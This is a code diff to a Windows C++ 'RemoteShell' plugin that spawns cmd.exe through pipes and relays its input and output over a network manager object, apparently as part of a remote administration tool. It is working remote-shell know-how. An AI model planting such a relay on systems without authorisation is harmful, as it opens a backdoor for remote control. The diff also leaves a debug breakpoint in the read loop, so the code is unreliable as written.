@@ -2,16 +2,27 @@
 #include <stdio.h>
 
 int RemoteShell::threadReader(register RemoteShell *_this){
+    char buff[800];
+    wchar_t wBuff[800];
+
     if(_this){
         _this->shell = createShell();
-        char* readData;
         _this->threadRuning = true;
+        //Espera hasta que se termine de cargar
+        while(!_this->mgr)Sleep(100);
+
         while(_this->threadRuning){
-            ulong bytesRead = readShell(_this->shell,&readData);
-            if(bytesRead){
-                _this->mgr->sendData(readData,bytesRead);
-                free(readData);
-            }else Sleep(10);
+            //long bytesRead = readShell(_this->shell,&readData);
+            long bytesRead = readShell(_this->shell,buff,sizeof(buff)-2);
+            if(bytesRead>0){
+                *((wchar_t*)(buff+bytesRead)) = 0;
+                bytesRead += sizeof(wchar_t);
+                __asm__("int3");
+                MultiByteToWideChar(CP_ACP, 0,buff,bytesRead,wBuff, bytesRead);
+
+                _this->mgr->sendData((char*)wBuff,bytesRead*sizeof(*wBuff));
+                //free(readData);
+            }else Sleep(20);
         }
     }
     return 0;
@@ -20,7 +31,10 @@ int RemoteShell::threadReader(register RemoteShell *_this){
 RemoteShell::RemoteShell(){
     mgr = null;
     shell = null;
-    hThreadReader = CreateThread(0,0,(LPTHREAD_START_ROUTINE)&threadReader,this,0,0);
+    recivedData = null;
+    ulong threadId;
+    hThreadReader = CreateThread(0,0,(LPTHREAD_START_ROUTINE)&threadReader,this,0,&threadId);
+    printf("newThread %x id\n",threadId);
 }
 
 RemoteShell::~RemoteShell(){
@@ -33,6 +47,9 @@ const char *RemoteShell::getPluginName(){
 }
 
 int RemoteShell::onReciveData(char *data, uint size){
+    bool writed = false;
+    printf("onReciveData %x bytes\n",size);
+
     return writeShell(shell,data,size);
 }
 
@@ -58,11 +75,14 @@ Shell* createShell(){
     CreatePipe(&shell->startInfo.hStdInput,&shell->hWrite,&attrib,0);
     shell->startInfo.hStdError = shell->startInfo.hStdOutput;
 
+    SetHandleInformation(shell->hRead, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(shell->hWrite, HANDLE_FLAG_INHERIT, 0);
+
     shell->startInfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
 
     CHAR cmdPath[MAX_PATH];
     GetSystemDirectoryA(cmdPath,MAX_PATH);
-    lstrcatA(cmdPath,"\\cmd.exe /d /Q /U");
+    lstrcatA(cmdPath,"\\cmd.exe /d /Q");
 
     CreateProcess(0,cmdPath,0,0,TRUE,0,0,0,&shell->startInfo,&shell->ProcessInformation);
     Sleep(500);
@@ -81,20 +101,24 @@ bool deleteShell(Shell* shell){
 
 int writeShell(Shell* shell,char* str,uint size){
     printf("%S\n",(wchar_t*)str);
+
     WriteFile(shell->hWrite,str,size,(ulong*)&size,0);
-    //WriteFile(shell->hWrite,"\r\n",lstrlen("\r\n"),&size,0);
 
     return size;
 }
 
-int readShell(Shell* shell,char** buff){
-    ulong BytesRead;
-    PeekNamedPipe(shell->hRead,0,0,0,&BytesRead,0);
+int readShell(Shell* shell,char* buff,ulong size){
+    wchar_t byte;
+    long BytesRead = 0,totalRead = 0;
 
-    *buff = (char*)malloc(BytesRead+1);
-    (*buff)[BytesRead] = 0;
+    while(PeekNamedPipe(shell->hRead,
+                        &byte,sizeof(byte),(ulong*)&BytesRead,0,0) && BytesRead>0){
+        ReadFile(shell->hRead,buff+totalRead,size-totalRead,(ulong*)&BytesRead,0);
+        totalRead += BytesRead;
+        if(totalRead == size)break;
+        Sleep(50);
+    }
+    if(totalRead)BytesRead = totalRead;
 
-    ReadFile(shell->hRead,*buff,BytesRead,&BytesRead,0);
-    printf("%S\n",(wchar_t*)*buff);
     return BytesRead;
 }
